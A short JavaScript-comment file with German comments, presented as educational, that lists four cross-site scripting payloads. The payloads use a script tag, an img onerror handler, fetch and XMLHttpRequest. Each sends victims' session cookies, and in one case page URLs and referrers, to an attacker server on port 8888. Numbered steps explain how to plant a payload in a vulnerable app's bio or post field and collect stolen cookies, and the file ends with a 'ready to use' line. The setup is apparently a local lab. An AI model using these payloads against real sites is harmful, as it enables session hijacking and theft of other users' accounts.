// COOKIE STEALER PAYLOAD - NUR FÜR BILDUNGSZWECKE
// Diesen Code in ein verwundbares Input-Feld einfügen (z.B. Bio, Post, Kommentar)

// ⚠️ WICHTIG: Attacker-Server muss auf Port 8888 laufen!
// Starten mit: python attacker_server.py

// Variante 1: Kompakt - als <script> Tag
// <script>fetch('http://127.0.0.1:8888/steal_cookie?c='+document.cookie)</script>

// Variante 2: Mit Image-Tag (falls <script> gefiltert wird)
// <img src=x onerror="fetch('http://127.0.0.1:8888/steal_cookie?c='+document.cookie)">

// Variante 3: Erweitert mit mehr Informationen
// <script>
// fetch('http://127.0.0.1:8888/steal_cookie?c='+encodeURIComponent(document.cookie)+'&url='+encodeURIComponent(window.location.href)+'&ref='+encodeURIComponent(document.referrer));
// </script>

// Variante 4: Mit XMLHttpRequest (für ältere Browser-Kompatibilität)
// <script>
// var xhr = new XMLHttpRequest();
// xhr.open('POST', 'http://127.0.0.1:8888/steal_cookie', true);
// xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
// xhr.send('c=' + encodeURIComponent(document.cookie));
// </script>

// USAGE INSTRUCTIONS:
// 1. Starte den Attacker-Server: python attacker_server.py (läuft auf Port 8888)
// 2. Starte die verwundbare App: python app.py (läuft auf Port 5001)
// 3. Kopiere eine der Varianten oben (ohne die führenden //)
// 4. Füge sie in ein verwundbares Eingabefeld ein (z.B. Bio-Feld, Post)
// 5. Wenn ein anderer User die Seite lädt, wird der Cookie an Port 8888 gesendet
// 6. Überprüfe die Konsole des Attacker-Servers oder stolen_cookies.txt

// BEISPIEL - READY TO USE:
// Kopiere diese Zeile und füge sie in das Bio-Feld oder Post-Feld ein:
// <script>fetch('http://127.0.0.1:8888/steal_cookie?c='+document.cookie)</script>
